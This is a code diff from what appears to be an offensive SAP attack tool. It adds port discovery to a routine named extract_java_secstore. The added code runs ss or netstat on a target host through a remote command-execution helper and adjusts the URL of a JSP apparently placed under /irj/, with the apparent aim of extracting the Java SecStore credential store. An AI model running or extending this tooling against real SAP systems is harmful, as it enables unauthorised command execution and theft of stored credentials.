@@ -242,6 +242,49 @@ def extract_java_secstore(node: SAPNode, state: SAPMAPState) -> dict:
                            f":{http_port}/irj/{jsp_name}")
                 print(f"[+] {node.sid}: probed Java root — using "
                       f"{probed_root}")
+                # -- ICM HTTP port discovery -----------------------
+                # Filesystem instance (e.g. J02) can differ from the
+                # ICM dispatcher instance (J00 → port 50000).
+                # Operator-reported J75: SAPControl inst 02, fs J02,
+                # but ICM on 50000.  netstat / ss is authoritative.
+                try:
+                    import re as _re_net
+                    if _linux:
+                        _nr = _sec_exec(
+                            "/bin/sh",
+                            "-c 'ss -tln 2>/dev/null "
+                            "|| netstat -tln 2>/dev/null'")
+                    else:
+                        _nr = _sec_exec(
+                            "cmd.exe",
+                            '/C netstat -an | findstr '
+                            'LISTENING | findstr ":50"')
+                    _listening = set()
+                    for _line in (_nr.get("output") or []):
+                        for _m in _re_net.finditer(
+                                r':(\d{5})\b', str(_line)):
+                            _lp = int(_m.group(1))
+                            if (50000 <= _lp <= 59999
+                                    and _lp % 100 in (0, 1)):
+                                _listening.add(_lp)
+                    if _listening and http_port not in _listening:
+                        _off = 1 if jsp_scheme == "https" else 0
+                        _cands = sorted(
+                            p for p in _listening
+                            if p % 100 == _off)
+                        if _cands:
+                            _old_p = http_port
+                            http_port = _cands[0]
+                            jsp_url = (
+                                f"{jsp_scheme}://{jsp_host}"
+                                f":{http_port}/irj/{jsp_name}")
+                            print(
+                                f"[+] {node.sid}: netstat "
+                                f"reveals ICM listens on "
+                                f"{http_port}, not {_old_p} "
+                                f"— corrected JSP URL")
+                except Exception:
+                    pass
             else:
                 print(f"[!] {node.sid}: could not enumerate a "
                       f"servlet_jsp/irj/root under J/JC/JD instances "
